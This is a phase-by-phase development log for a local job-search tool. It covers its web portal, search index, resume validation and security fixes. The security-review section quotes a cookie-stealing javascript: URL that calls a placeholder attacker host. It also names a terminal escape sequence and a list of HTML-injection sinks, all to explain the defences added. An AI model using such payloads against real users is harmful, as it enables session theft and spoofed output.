Reported by the user on the first real run, and the most instructive bug of the
phase because none of it was new code.

`api()` did not catch a rejected `fetch`. Every action that had written a
progress word into the page — "Saving...", "Checking that board...", "Looking
for a local model..." — left that word there permanently if the request never
completed, and said nothing else. The trigger is ordinary: the portal was
stopped while the tab stayed open.

Three things were wrong, and the third is the one that matters:

1. `api()` propagated the rejection, so every caller died mid-action.
2. Callers assumed success anyway — `payload.sources.enabled` on a `{}` payload
   throws, and `payload.items || []` renders "Nothing evaluated yet", which is
   a lie about an unreachable server rather than an empty database.
3. A restarted portal mints a new token, so the *likeliest* real failure is a
   403 on an old tab — and "403" is not something a person can act on.

`api()` now returns a stated reason instead of throwing, distinguishing an
unreachable server, a stale token, and a timeout; every caller renders it. There
is a 15-second timeout because a stopped server usually refuses instantly, but a
browser holding a keep-alive socket to a process that has gone away waits for
the TCP timeout instead — measured at several seconds of silence before the fix
reported anything. A last-resort `unhandledrejection` handler writes to the
alert bar, so no future action can freeze quietly.

Two tests now hold this: the harness stops the portal and presses Save, and it
runs the page with a token from an "earlier run". The harness had to stop
forcing the correct token into every request first — it was supplying the right
credential regardless of what the page held, which is precisely the thing that
needed testing.

**Two process lessons.** The cross-model reviews were scoped to the diff of each
phase, so a latent defect in a file that phase did not touch was never in front
of them. And the browser check was "does the new view render", not "what happens
when this fails" — the failure paths were never exercised against a real server
at all.

### Nothing new is decided in the web layer

Every route calls the function the CLI calls — `recordApplication`, `skipRole`,
`addNote`, `setStatus`, `funnel`, `segments`, `search`. If the portal and the
terminal could disagree about what applying to a role means, one of them would
be lying and it would not be obvious which.

That constraint is what made this phase small: three files, no new tables, no
new domain logic. The work was in the views, not underneath them.

### Apply records; it cannot apply

The button says "Record that I applied", records the application, and opens the
employer's page in a new tab. It has no way to submit anything, and the copy
beside it says so. A button labelled "Apply" in a tool that cannot apply is the
one place this product could most easily mislead somebody about what it just
did on their behalf.

The queue keeps a decided role visible with its decision beside it rather than
removing it. A queue that empties as you act on it cannot be checked afterwards.

### Two layers against hostile text, because one is a promise

Job postings are written by strangers. The server bounds every string and
flattens it to one line — that is what stops a terminal escape or a newline from
rewriting the layout — and the page builds every node through `textContent`.

A *title* is passed through verbatim, angle brackets and all, because rewriting
it would misquote the employer. The safety property is not that markup is
removed; it is that markup can only ever be displayed. A test asserts the review
script contains no `innerHTML`, `outerHTML`, `insertAdjacentHTML` or
`document.write`, and the page's CSP already forbids everything else.

### What opening the page found

The script is a string inside a `.ts` file, so it is executed against a DOM shim
in tests, as the configuration page already was. That caught nothing this time.
Opening the real page in a real browser caught the thing the shim cannot see: a
CSS collision. `.co` was already the catalog's full-width company card, so every
review card rendered the employer's name inside a bordered box on its own line.
Renamed to `.byline`.

The other find was a test that had been quietly protecting the right rule:
`portal.test.ts` asserts free text exists only where free text belongs. The
history search box tripped it. The assertion was updated with the reason —
searching is not configuration, nothing typed into it is saved, and there is no
set of options to pick from — rather than deleted.

### What a cross-model review found

The worst of it was a URL. `canonicalizeUrl` accepts only `http:` and `https:`,
but a posting's `source_url` is stored raw when canonicalisation fails — so a
posting advertising `javascript:fetch('http://attacker/'+document.cookie)`
reached the queue, was displayed as the link, was saved as the place the user
applied, and was handed to `open()` the moment they pressed *Record that I
applied*. `noopener` is irrelevant to that: it is not a window-reference
problem, it is a scheme problem.

Three changes, because one was not enough for a sink this bad: the server emits
only canonicalised `https` links, `/api/decide` no longer accepts a URL from the
request at all (`recordApplication` derives it from the posting), and the page
refuses to open anything that is not `http`/`https`. The DOM harness now presses
the button on a role whose only link is script, with a spy on `open`.

The rest:

| Finding | What it allowed |
|---|---|
| `GET /api/history` refreshed the search index | A read ran a write transaction over the whole corpus — from a GET, unthrottled, in a loop if a page wanted one. `roleeye ui` syncs once at startup; the route is read-only. |
| `listRecommendations` picked the latest verdict with `MAX(created_at)` | Two evaluations of one role saved in the same millisecond both satisfy the maximum, so the queue showed one role twice with contradictory advice. It orders by insertion within the instant now, exactly as status history already had to. |
| `/api/pipeline` and `/api/job` had unbounded fan-out | Every application, with every status event and every note, built into one response by the single process everything else runs in. All three are bounded and the page can ask for a page size, capped. |
| `since` was passed to the report window unvalidated | `?since=whenever` silently produced a report over a window nobody asked for. It is a 400 now. |
| `POST /api/note` had no way to be called | The route existed and no button reached it. Notes are the thing a scraper cannot know — who the recruiter was, what the salary conversation actually said — so the detail panel now has the field. |

## Phase 6 notes

Search, analytics, and `ask` — three commands over data that already existed.

### The index is derived, and that is the design

`search_documents` holds logical documents (§19): a posting, a verdict, a note,
an answer, an outcome. Every one is built from a record and carries the hash of
what it was built from, so a rebuild is incremental and dropping the whole index
is always safe. An index that is *also* a place things are stored eventually
disagrees with the database, and the database is the source of truth.

FTS5 is external-content, so descriptions are stored once rather than twice — a
few thousand postings at up to 100 KB each is not something to keep two copies
of for the sake of a simpler trigger.

Sync is set-based SQL: five `INSERT … SELECT … WHERE NOT EXISTS` statements and
one delete. A hundred postings and ten thousand cost the same six statements.
The alternative — read everything, hash it in TypeScript, write it back — is how
a two-second command becomes a two-minute one exactly when the corpus gets big
enough to be worth searching.

### User words are words, not query syntax

FTS5's `MATCH` is a language: `AND`, `NEAR`, `*`, `"`, `:` and `^` all mean
something, and a stray quote is a syntax error. Someone typing
`senior "staff" engineer (remote)` means those words. Every term is quoted as a
literal and the operators are unreachable from input, because a search box that
can raise a syntax error is a search box people stop using.

### The funnel is computed, never remembered

Nothing in migration 008 stores a metric. The funnel is a query over `jobs`,
`job_screenings`, `evaluations`, `applications` and `application_status_events`,
which is why those tables record history rather than a current state.

The stages past `applied` read the *events*, not the current status: an
application that reached a final round and was then rejected had a final round.
Counting where things ended up would report a pipeline in which nobody was ever
interviewed.

A rate with no denominator is `undefined`, not `0%`. "0% of applications got a
screen" is a claim about a job search; "no applications yet" is a fact about a
database.

### `ask` shows its work, and refuses what it cannot do

The planner is deterministic and makes no model call. That is not a limitation
of the phase: "When did I apply to Zeta?" has one right answer sitting in a
table, and sending it to a model adds latency, cost and the possibility of a
wrong date. §21 says it directly — never produce an exact date or status from
memory when a record exists.

Every answer names the plan, why it was chosen, and the `roleeye search` or
`roleeye stats` command that reproduces it. An answering interface that cannot
be checked is one you have to trust.

SEMANTIC questions — "which roles felt similar to that one?" — are recognised
and refused, naming embeddings and Phase 7. Answering them from keyword overlap
would produce a confident, plausible, wrong list.

Two things live testing changed. A company is matched only against companies
that exist in the database, because guessing from capitalisation reads "Staff
Engineer" as an employer. And a constraint consumes its own words: "When did I
apply to Ramp?" filters on the company, and leaving `ramp` in the text query
also demanded the word appear in the body — FTS requires every term, so the
question that had a perfectly good structured answer returned nothing.

### What a cross-model review found

| Finding | What it allowed |
|---|---|
| `group_concat` over no rows returns NULL, and `body` is `NOT NULL` | An application with no status events would have aborted the *entire* sync, not just its own document. |
| The funnel took the latest verdict and *then* applied the window | A role recommended in July and re-evaluated in September reported July as having recommended nothing. A later opinion was rewriting an earlier month. |
| Evaluations and notes were keyed on their id alone | They are append-only today, so nothing was stale. But an index whose correctness rests on nobody adding an edit path later is one that expires quietly. Both now hash the content they were built from and update when it changes. |
| `\s` does not match ESC | Excerpts collapse whitespace before printing, which does nothing to `\x1b[1A`. A posting could move the cursor up and overwrite the result printed above its own. |
| The company match was a substring test | "How many roles skip the ramp-up period?" silently restricted the whole question to Ramp. It matches on word boundaries now. |
| `skip` meant the user skipped | "Which roles skip the technical screen?" was read as `applied: false` and returned nothing, explaining nothing. |

The seventh finding — that the correlated "latest verdict per role" subquery
would degrade badly — was measured rather than argued about
(`scripts/measure-search.ts`). At 10,000 jobs and 13,000 documents: a full index
build 512 ms, an incremental sync over an unchanged corpus 82 ms, a keyword
search 15 ms, the structured search carrying that join **4 ms**, and the funnel
3 ms. It is an index seek per row against `idx_evaluations_job`, not a scan, so
it stays.

## Phase 5 notes

Application tracking, status history, notes, overrides and the question bank
shipped on 2026-08-14 (`roleeye apply record|status|note|skip|list|show`). What
follows is the last item of the phase, added afterwards.

### Form inspection

`roleeye apply questions <job-id>` answers one question: *what does this
application ask that my resume does not already say?*

The value is the residue. Name, email, phone and the resume upload are already
answered by the documents Phase 4 produces; the thing that costs an evening is
the twelve boxes underneath them, which are largely the same twelve boxes as the
last employer's. So the report splits them and matches only the residue against
the bank.

Coverage is narrow because reality is:

| Provider | Publishes its form? |
|---|---|
| Greenhouse | yes — `?questions=true` on the board API |
| Lever | no |
| Ashby | no |

All three were checked live. The alternative — rendering an apply page in a
browser and reading its inputs — would produce a confident guess about what an
employer asks, and the career-page adapter already refuses to do exactly that
for postings. An unsupported provider says so and names the URL to open.

Three things the form itself is not allowed to do: reach the answer bank with a
self-identification question, survive as markup into a label, or supply a
protected answer by resembling one. The first is a policy (EEO questions are
per-application and are never stored), the second is §40 applied to a new
boundary, and the third is `AnswerRepository.lookup` doing what it already did.

`--save` writes each unanswered question into the bank with no answer — the
honest state: the form asked, nothing has been said yet. Answer it once with
`roleeye apply answer`, and the next employer asking the same thing shows it
back.

### What a cross-model review found

A second model attacked the diff before it merged. Six findings were real, and
four of them were about the same thing: the answer bank's key is *deliberately
lossy* — that is how two phrasings of one question share a row — and lossy keys
had become the only thing standing between a protected question and somebody
else's answer.

| Finding | What it allowed |
|---|---|
| Key collisions crossed the sensitivity boundary | An employer writing a question that shares a key with a protected one was shown the user's answer to the other question. A protected question now requires the *whole* question to match, and sensitivity must agree in both directions. |
| Labels were truncated to 200 characters before the sensitivity check | "…do you require visa sponsorship?" placed past the cut read as an ordinary question. Labels are now bounded for storage, not for display; the CLI truncates when it prints. |
| Demographics were classified by provider field name only | A voluntary "What is your sexual orientation?" added as an ordinary custom question arrives as `question_14826587008`, which matches nothing — so it was looked up in the bank and stored. Classification now reads the question too. |
| Board and job id were derived independently | A posting URL is attacker-influenced, so a configured board could be paired with a number scraped off another URL, returning a different role's questions under this role's name. Both halves now come from one URL, and a disagreement is refused rather than resolved. |
| `{}` was reported as "this form asks nothing" | A provider changing its response shape would have produced the most misleading output available. A payload with no question list is now unreadable, not empty. |
| `--json` returned 0 where the text output returned 5 | Automation saw success for a run that printed "0 of 14 ready to reuse". One outcome is computed once, for both modes. |

Two of the regex findings were checked by running them rather than reading
them. The substring patterns matched `manage` (via `age`), `embrace` (via
`race`), `disable`, `traced` and "object orientation" — five ordinary
engineering questions refused as protected, which is how a user learns to
ignore the protection. They are anchored on word boundaries now, and the same
pass added the phrasings that were missing: work permit, employment
authorization, hourly rate, wage, OTE, national origin, ancestry.

## Phase 4 notes

The phase began by settling four things the plan had left wrong or unstated —
the archetype classifier that did not exist, where facts live, whether the
`artifacts` table could be reused, and which libraries read a `.docx`. Each is
in the decisions log above.

### The pipeline

`resume import` → `resume approve` → `resume archetypes` → `resume classify` →
`resume generate` → `resume delta`. Import and approval are separate commands
because approval is the point where a human is required, and a step that runs
automatically is a step nobody performs.

### Classification costs nothing, and says so

Assigning 12 postings to 2 archetypes makes zero model calls: it scores the
title against the archetype's own terms and the requirements Phase 3b already
extracted. `AssignmentSummary.modelCalls` is typed as the literal `0`, so a
regression that quietly adds a call cannot compile.

A weak or tied score leaves the posting unassigned rather than guessing. The
unassigned pile is the signal that an archetype is missing, and a wrong
assignment silently sends the wrong resume.

### What live testing changed

The suite passed before any of this was found. All of it came from running the
thing against a real model and a real document.

- **The summary was unwriteable.** The first live generation produced "Staff
  software engineer at Acme Corp since 2019…", which validation rejected as an
  invented number *and* an invented term. Both facts are in the store, in the
  experience block that prints as the section heading. Validation now counts a
  cited fact's own employer, title and dates as evidence.
- **`--seed software,ai` reported "no role families matched"** without saying
  which ids exist. (The cause was PowerShell splitting the argument, not the
  parser — but the message was useless either way, and now lists them.)
- **`resume show` printed raw experience ids** as section labels.

The second live run, through Copilot CLI with `claude-sonnet-4.5`, produced a
clean resume: three bullets, a summary, every claim traced to an approved fact,
nothing dropped. It led with the GPU inference bullet for the AI archetype —
which is the entire point of an archetype — and left out the Globex facts,
because only the Acme experience block had been approved.

### Validation is the product

`validate.ts` is written adversarially, against the specific ways a model
embellishes when asked to "tailor": rounding 43% to "nearly half", adding the
technology the job asked for, promoting a team of three to "a large team". Each
one is a test. A claim must cite approved facts, its numbers must appear in
them, and any named technology or acronym must too.

Unsupported claims never reach a document. They are stored with their problems
and reported, so the user sees what the model tried to say.

### Cost

One archetype resume is about 360 tokens of approved facts and one call.
Twelve postings across two archetypes cost two generations, not twelve — the
assertion is in the test suite rather than in a comment.

### Import

`.docx` via `mammoth`, `.pdf` via an optional `pdfjs-dist`, `.md`/`.txt`/`.yaml`
directly. Only bullets become facts. Employment headings are parsed only when a
date range makes them unambiguous; where the shape is genuinely ambiguous —
which half of "Northwind Trading Systems 2019 – 2023" is the employer — nothing
is guessed and the ambiguity is reported.

Everything imported is a draft. Re-importing the same file reconciles rather
than duplicating, and editing an approved statement returns it to draft, because
approval was given to particular words.

### Two model reviews attacked this phase before it merged

GPT-5.6 Sol reviewed the implementation and Gemini 3.1 Pro reviewed it for
security, independently. Both returned **no-go**. Every finding below was
reproduced here before it was acted on, and two were reproduced *and rejected*:

- The claimed zero-width fence bypass (`U+200B`) is already contained, because
  `stripControlCharacters` removes it at ingest. The vulnerability was real, but
  through `U+00AD`, `U+2060` and combining marks — characters that set misses.
- Re-importing an already-attached fact under a different employer does **not**
  move it; the first attachment wins. The hole was narrower: an *unattached*
  approved fact could acquire an attacker-supplied employer.

What they found that was real and is now fixed: the fence marker, the validator
bypasses (lower-case technologies, unicode digits, written magnitudes, invented
scope, links), Markdown injection into artifacts, the decompression bomb,
approval surviving a provenance change, stale claims in deltas, and a failed
write leaving a phantom "current" resume.

### What live testing changed, again

The tightened validator was run against the real model before being believed.
It immediately dropped a *correct* summary, because "Works" opened the second
sentence and the capitalisation heuristic only exempted the first word of the
claim. Fixed to exempt every sentence opener, which is safe because lower-case
technologies are now caught by lexicon and shape rather than by case.

The next live run dropped the summary again — this time correctly: the model had
written "12 years of experience", which appears in the career profile and in no
approved fact. The profile is context for tone, not a source of claims. Saying
so explicitly in the prompt produced a complete, fully supported resume.

### Known and deliberately not fixed yet

All three were fixed on 2026-08-14, before Phase 5, because two of them needed
a migration and doing that after Phase 5 adds its own tables is more expensive:

- ~~`statement_hash` is globally unique, so the same sentence under two
  employers collapses into one fact and the second provenance is lost.~~
  Migration 006 scopes identity to the employer.
- ~~A `--force` reclassification does not retire an older manual override.~~
  Manual rows are superseded.
- ~~`assignArchetypes` issues roughly six queries per job.~~ Measured after:
  100 roles in 4 statements, 1,000 roles in 8 statements and 42 ms.

## Phase 3.5 notes

Windows toasts need no native dependency, but they do need three things that
were only discoverable by trying them:

1. **Windows PowerShell 5.1, not PowerShell 7.** WinRT types cannot be loaded in
   pwsh, so the script runs under `System32\WindowsPowerShell\v1.0`.
2. **Both WinRT types loaded explicitly** — the notification manager *and*
   `Windows.Data.Xml.Dom.XmlDocument`. Loading only the first fails at the point
   the document is constructed.
3. **A registered AppUserModelID.** PowerShell's own is used, because a toast
   from an unregistered app id is silently dropped.

### Toast content travels in an environment variable

Company names and job titles are chosen by whoever posted the job. Embedding
them in the PowerShell script text means a title containing a quote can end a
string literal. The XML is passed in `ROLEEYE_TOAST_XML` instead, which
PowerShell treats as data, and the text is XML-escaped with control characters
stripped so the document still loads.

### The acceptance criterion was tested literally

"A scheduled scan can notify without a terminal attached" was verified by
registering a real scheduled task, triggering it, and confirming `Last Result: 0`
with the toast delivered — not by reasoning that it should work.

### Thresholds default to APPLY only

A notifier that fires on everything gets muted, and a muted notifier is worse
than none because it still looks like it is working. `notify.min_decision`
defaults to `APPLY`; the digest command says which setting to lower when it
finds nothing.

## Phase 3b notes

The reasoning boundary has one primitive, `generate<T>()`, returning an envelope
(data, usage, finish reason, model, request id, latency, attempts). It is
deliberately *not* shaped around the product — there is no `assessJob()` method —
so a provider cannot quietly acquire product logic, and the whole pipeline can be
replayed against a scripted provider.

Scoring is computed in code from the model's per-category scores multiplied by
the user's weights. The model supplies judgement on bounded questions; it never
supplies the number. Scores are therefore reproducible, and re-weighting does not
require re-running a model.

### Cost is measured, not estimated

`evaluate --dry-run` prints the exact prompts, the token counts and the price
before anything is sent. Against live data, one Ramp posting is 1,077 tokens and
588 after stripping. The portal shows price per 100 roles per model *before* the
user picks one, because a model choice is a spending decision.

### The model picker exists so "local" is a real option

Selecting Ollama is one click, and `POST /api/reasoning/detect` asks a local
Ollama which models are actually installed — offering a model the user has not
pulled is offering a broken choice that would only fail much later, mid-run.
Choosing a local model means nothing leaves the machine, and the UI says so on
the card rather than in documentation.

### What live testing changed

- `stripBoilerplate` was rewritten from section matching to truncation (see the
  decisions log). Section matching saved 19 tokens of 1,077.
- The dry run claimed "Data leaves this machine: yes" when no provider was
  configured and nothing would be sent at all.
- Nested config objects were not strict, so a mistyped hard-filter key was
  silently ignored.
- A malformed `criteria.yaml` crashed the portal route with an opaque 500.

## Phase 3c notes

The portal was pulled forward from 6.5 after user feedback: hand-writing YAML was
blocking real use. The earlier "defer the portal" argument was about managing
*state*, which is still true — so the portal was split. Configuration editing
ships now; the review queue, application timeline, and analytics stay at 6.5
where the state they display will exist.

- `roleeye ui` binds `127.0.0.1` only, mints a token at start, and refuses
  cross-origin writes. Verified in a real browser: a cross-origin `PUT` gets 403.
- The web layer holds no rules. It reads and writes the same YAML through the
  same zod schemas the CLI loader uses, so the two cannot disagree.
- An invalid save returns per-field problems and writes nothing.
- The portal opens even when a config file on disk is broken, which is exactly
  when someone needs it.
- Board lookup checks a pasted careers URL against the live adapter through the
  URL guard, so nobody has to know what an ATS board token is.
- No bundler and no framework: `node:http` plus one embedded page module, so
  `tsc` remains the only build step and the whole UI is auditable in one file.
- All third-party text is inserted as text nodes; `innerHTML` is never assigned
  anywhere on the page, and a test asserts that.

### Configuration by picking, not typing

The first version still asked for comma-separated lists in six text boxes, which
means asking the user to guess our matching rules. Replaced with:

- **51 preloaded company boards**, every token verified live against its
  provider before shipping. 16 of the first 50 guesses were wrong, which is
  exactly why an unverified catalog would have shipped broken. Re-check any time
  with `npm run catalog:check`.
- **Role families** — "Software engineering" expands into the title terms and
  the lookalike exclusions ("sales engineer" is not a software engineer).
- **Seniority, locations, metros, salary, recency, and refused application
  systems** as chips and scales.
- Free text survives only in an Advanced panel, so nothing is lost — only typing.

Seniority compiles to level *exclusions* rather than inclusions: an inclusion
list silently drops every posting whose title states no level, which is a large
share of real postings.

Verified end to end in a browser from a clean install: five companies picked by
clicking, no typing at all → `doctor` passed → `scan` fetched 1,715 postings and
stored the 123 in scope → `screen` marked 113 eligible → reopening the portal
showed every selection restored. Mobile collapses to a single column at 390px
with no horizontal scroll.

## Phase 3a notes

A third model (Claude Opus 4.6) reviewed the forward plan before this phase. Its
findings changed the sequencing:

- Phase 3 was split. 3a is entirely deterministic — no model, no spend — so hard
  filters could be used immediately without waiting for evaluation to be good.
- The portal moved from 3.5 to 6.5. Its own justification was that "the CLI
  proves the workflow", and the workflow is not proven until applications are
  tracked.
- VPS sync and the private job site were demoted out of the plan entirely. The
  goal is an agent anyone can run and schedule on their own machine.
- Feedback capture moves earlier: application overrides are recorded from Phase 5
  so the learning loop has data long before it is built.
- Resume fact approval will be per experience block, not per fact. Approving 60
  atomic facts is a form nobody fills in honestly.

Built in 3a:

- criteria engine with a content-derived hash, so editing a threshold correctly
  invalidates cached decisions without a hand-maintained version field
- deterministic hard filters with explicit `pass` / `reject` / `unknown`, and a
  configurable policy for missing data. Most postings state no salary, so
  rejecting all of them by default would be useless; the default flags instead
- authenticity screening across four independent dimensions
- `roleeye screen`, `roleeye verify`, `roleeye backup`, `roleeye schedule`,
  and `roleeye init --interactive`
- migration 004: `job_screenings`, `llm_calls`, and a content-only key

### The fraud patterns had to be rewritten after live testing

The first version blocked a legitimate Shield AI avionics role. It matched
"**wire** harnesses ... **equipment** procurement" — ordinary job duties. A
confident false accusation is far more damaging than a missed scam, because the
user stops trusting every verdict the tool produces.

Every payment pattern now requires the applicant to be the party paying, and the
messaging-app and free-email patterns require an instruction to make contact
that way. Validated across 273 real postings from two companies: zero signals
fired. The avionics text and four similar phrasings are pinned as regression
tests.

### Other decisions

- Backups use `VACUUM INTO`, which is synchronous, so a migration cannot begin
  before the snapshot exists. A failed backup aborts the migration.
- The content-only key exists because `fingerprint` and `cluster_key` both
  include the company, so neither could ever answer "is this same description
  being advertised by unrelated companies?"
- Scheduling builds its command as data and supports `--print`, because a tool
  that edits your crontab should show you the line first.

## Phase 2.5 notes

Two models reviewed the codebase independently before Phase 3 (design critique by
GPT-5.6 Sol, implementation review of the Phase 2 diff by Gemini 3.1 Pro). Every
claim was reproduced before being acted on. Eight confirmed bugs:

1. `history` capture overwrote a stored body with an empty string — a direct
   violation of the preserve-history rule.
2. Switching a source from `history` to `full` never backfilled the body, because
   the stored hash already described content the database did not hold.
3. An out-of-scope role stopped being refreshed entirely, so `in_scope` went
   stale and `last_seen_at` froze.
4. `max_new_per_source_per_scan` truncated the raw fetch (both reviewers).
5. `gh_jid` was stripped as a tracking parameter, breaking embedded Greenhouse
   capture — it identifies the posting, not a campaign.
6. Greenhouse departments were declared in the payload type but never mapped, so
   department scope filters silently did nothing for that provider.
7. `closed_at` was never written anywhere: roles never closed, `--include-closed`
   was meaningless, and the ghost-job longevity signal had no data.
8. Salary still misparsed `"raised a $5M seed round. Salary is competitive."`,
   and dropped valid JPY/INR salaries as implausible.

Also corrected: ATS URL matchers used substring host checks; the browser fallback
guarded only the top-level URL while Chromium fetched subresources unrestricted,
and `docs/progress.md` had claimed otherwise.

A sobering note: 171 tests passed while all of this was present. The suite largely
confirmed the behaviour that was written rather than attacking it. The new tests
in `tests/integration/dedupe.test.ts` are written the other way round.

Migration 003 was verified against a populated database built by the previous
release: 49 jobs, 31 snapshots, and 49 events migrated with zero orphans and zero
foreign key violations, and the following scan was correctly idempotent.

## Phase 2 notes

- Adapters: Greenhouse, Lever, Ashby, and a generic career page. Lever and Ashby
  provide structured salary ranges, which are preferred over parsing prose.
- Capture modes (`scoped`, `full`, `history`) and scope filters are configured in
  `config/sources.yaml`, previewable with `roleeye scope test`.
- `roleeye add <url>` uses ATS single-posting endpoints where they exist and falls
  back to page JSON-LD. It bypasses the scope filter deliberately: the user asked
  for that specific role.
- Every outbound request, including the browser fallback, passes the Phase 1 URL
  guard.
- Verified live across all three ATS providers: 588 postings fetched, scope
  dropped 327, `history` mode stored 18 rows with zero bodies, and a second scan
  reported 276 unchanged with no duplicates.
- Salary audit over 276 live postings: 275 parsed, all plausible (annual
  76k-440k, five genuinely hourly technician roles).

## Phase 1 notes

- Identity hierarchy: source job ID → canonical apply URL → company/title/location/content
  fingerprint. Titles alone never merge two jobs.
- Reposts are recorded as events; `first_seen_at` is never rewritten.
- A changed description writes a new snapshot and keeps the previous one.
- A failing source marks only its own `source_run` as failed; other sources still persist,
  and no job is marked closed because of a failed run.
- Verified end to end against a live public Greenhouse board: 16 jobs ingested, second scan
  reported 16 unchanged and created no duplicates.

## Pre-Phase-2 hardening notes

Full report: `docs/security-review-phase1.md`. Spend analysis: `docs/spend-analysis.md`.

- Postings are now treated as untrusted input at a single boundary: control
  characters stripped, escaped markup unable to re-materialize, descriptions capped.
- All outbound requests pass a URL guard (HTTPS only; private, loopback, and
  link-local ranges blocked; every redirect hop re-validated). Applied to every
  Phase 2 adapter, to `roleeye add <url>`, and — since Phase 2.5 — to every
  subresource the browser fallback requests.
- Log redaction covers URL-borne credentials and query-string secrets.
- Lockfile provenance corrected; `npm audit` reports 0 vulnerabilities.
- Measured corpus: median description 1,532 tokens, ~44% boilerplate
  (`scripts/measure-corpus.ts` reproduces it).

## Open items carried into Phase 2

- ~~The lockfile was normalized textually because this machine cannot reach
  `registry.npmjs.org` (TLS interception). Confirm with a clean `npm ci` on a
  machine or CI runner with public registry access.~~ **Confirmed 2026-08-14**:
  the first CI run installed from this lockfile against the public registry on
  both Ubuntu and Windows. The rewrite is honest and the tarballs exist there.
- `scripts/measure-corpus.ts` performs live network calls. It is a developer
  tool, never invoked by the product or the test suite.

## Before starting each phase

1. Summarize the phase.
2. List files to create/change.
3. List new dependencies.
4. Implement the smallest complete vertical slice.
5. Add and run tests.
6. Update this file and the README.
